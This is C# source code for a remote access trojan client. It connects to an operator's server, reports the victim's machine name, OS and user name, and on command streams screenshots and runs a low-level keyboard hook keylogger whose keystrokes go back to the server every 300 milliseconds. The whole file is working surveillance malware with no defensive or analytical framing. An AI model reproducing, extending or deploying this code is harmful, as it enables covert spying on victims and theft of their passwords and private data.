using System;
using System.Net.Sockets;
using System.Text;
using System.Web.Script.Serialization;
using System.Timers;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Diagnostics;
using RatClient.Config;

class Program
{
    private Config config = new Config();
    // Keylogger implementation
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_KEYUP = 0x0101;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static StringBuilder keyStrokes = new StringBuilder();
    private static System.Timers.Timer keySendTimer;
    // Networking
    static TcpClient client;
    static NetworkStream stream;
    // Screen viewer
    static System.Timers.Timer screenshotTimer;
    static Queue<string> screenshotChunks = new Queue<string>();
    static bool isSendingScreenshot = false;
    // Config
    static readonly string Server = Config.IP;
    static readonly int Port = Config.Port;
    static readonly int bufferSize = Config.BufferSize;

    static void Main(string[] args)
    {
        try
        {
            client = new TcpClient(Server, Port);
            stream = client.GetStream();

            SendInfo();

            // Initialize and start the timer
            keySendTimer = new System.Timers.Timer(300); // Set the interval to 300 ms
            keySendTimer.Elapsed += SendKeystrokes;
            keySendTimer.Start();

            while (true)
            {
                byte[] data = new byte[bufferSize];
                int bytes = stream.Read(data, 0, data.Length);
                if (bytes == 0) break;
                string responseData = Encoding.UTF8.GetString(data, 0, bytes);
                dynamic responseJson = new JavaScriptSerializer().Deserialize<dynamic>(responseData);

                if (responseJson["type"] == "message")
                {
                    Console.WriteLine("Received: {0}", responseJson["text"]);
                }
                else if (responseJson["type"] == "heartbeat")
                {
                    SendHeartbeatResponse();
                }
                else if (responseJson["type"] == "set_interval")
                {
                    SetIntervalAndStartSendingScreenshots((int)responseJson["interval"]);
                }
                else if (responseJson["type"] == "stop_screenshots")
                {
                    StopSendingScreenshots();
                }
                else if (responseJson["type"] == "start_keylogger")
                {
                    StartKeyLogger();
                }
                else if (responseJson["type"] == "stop_keylogger")
                {
                    StopKeyLogger();
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Exception: {0}", e);
        }
        finally
        {
            if (stream != null) stream.Close();
            if (client != null) client.Close();
        }
    }
    static string GetPC()
    {
        return Environment.MachineName;
    }
    static Tuple<string, string> GetOS()
    {
        return new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
    }
    static string GetUser()
    {
        return Environment.UserName;
    }
    static void SendInfo()
    {
        var osInfo = GetOS();
        string pc = GetPC();
        string user = GetUser();

        var jsonOSInfo = new
        {
            type = "info",
            os = osInfo.Item1 + " " + osInfo.Item2,
            pc = pc,
            user = user
        };
        SendJson(jsonOSInfo);
    }
    static void SendMessage(string message)
    {
        var jsonMessage = new
        {
            type = "message",
            text = message
        };
        SendJson(jsonMessage);
    }
    static void SendHeartbeatResponse()
    {
        var heartbeatResponse = new
        {
            type = "heartbeat",
            text = "pong"
        };
        SendJson(heartbeatResponse);
    }
    static void SetIntervalAndStartSendingScreenshots(int interval)
    {
        screenshotTimer = new System.Timers.Timer(interval);
        screenshotTimer.Elapsed += (sender, e) => SendScreenshot();
        screenshotTimer.Start();
    }
    static void StopSendingScreenshots()
    {
        if (screenshotTimer != null)
        {
            screenshotTimer.Stop();
            screenshotTimer.Dispose();
            screenshotTimer = null;
            SendMessage("Stopped sending screenshots.");
        }
    }
    static void SendScreenshot()
    {
        if (isSendingScreenshot)
            return;

        isSendingScreenshot = true;
        screenshotChunks.Clear();

        var screenshot = CaptureScreen();
        string base64Screenshot = Convert.ToBase64String(screenshot);
        int chunkSize = CalculateMaxChunkSize();

        for (int i = 0; i < base64Screenshot.Length; i += chunkSize)
        {
            string chunk = base64Screenshot.Substring(i, Math.Min(chunkSize, base64Screenshot.Length - i));
            screenshotChunks.Enqueue(chunk);
        }
        SendNextScreenshotChunk();
    }
    static int CalculateMaxChunkSize()
    {
        var sampleMessage = new
        {
            type = "screenshot_chunk",
            data = "",
            final = false
        };
        string emptyJson = new JavaScriptSerializer().Serialize(sampleMessage);
        int jsonOverhead = Encoding.UTF8.GetByteCount(emptyJson);
        int maxDataSize = bufferSize - jsonOverhead;
        return maxDataSize * 3 / 4;
    }
    static void SendNextScreenshotChunk()
    {
        if (screenshotChunks.Count > 0)
        {
            string chunk = screenshotChunks.Dequeue();
            bool isFinal = screenshotChunks.Count == 0;
            var screenshotMessage = new
            {
                type = "screenshot_chunk",
                data = chunk,
                final = isFinal
            };
            SendJson(screenshotMessage);

            if (!isFinal)
            {
                Task.Delay(10).ContinueWith(t => SendNextScreenshotChunk());
            }
            else
            {
                isSendingScreenshot = false;
            }
        }
    }
    static byte[] CaptureScreen()
    {
        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Graphics graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size);
        using (MemoryStream memoryStream = new MemoryStream())
        {
            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            return memoryStream.ToArray();
        }
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        try
        {
            // Ensure that the event is a keyboard event
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_KEYUP))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                keyStrokes.Append((Keys)vkCode + "\n");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error in HookCallback: " + ex.Message);
            // Consider whether to disconnect or just log the error
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    static void StartKeyLogger()
    {
        _hookID = SetHook(_proc);
        Application.Run();
    }

    static void StopKeyLogger()
    {
        if (_hookID != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookID);
            _hookID = IntPtr.Zero;
        }
    }

    static void SendKeystrokes(object sender, ElapsedEventArgs e)
    {
        if (keyStrokes.Length > 0)
        {
            SendJson(new { type = "keystroke", key = keyStrokes.ToString() });
            keyStrokes.Clear(); // Clear the buffer after sending
        }
    }

    static void SendJson(object jsonObject)
    {
        string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
        byte[] data = Encoding.UTF8.GetBytes(jsonString);
        stream.Write(data, 0, data.Length);
    }
}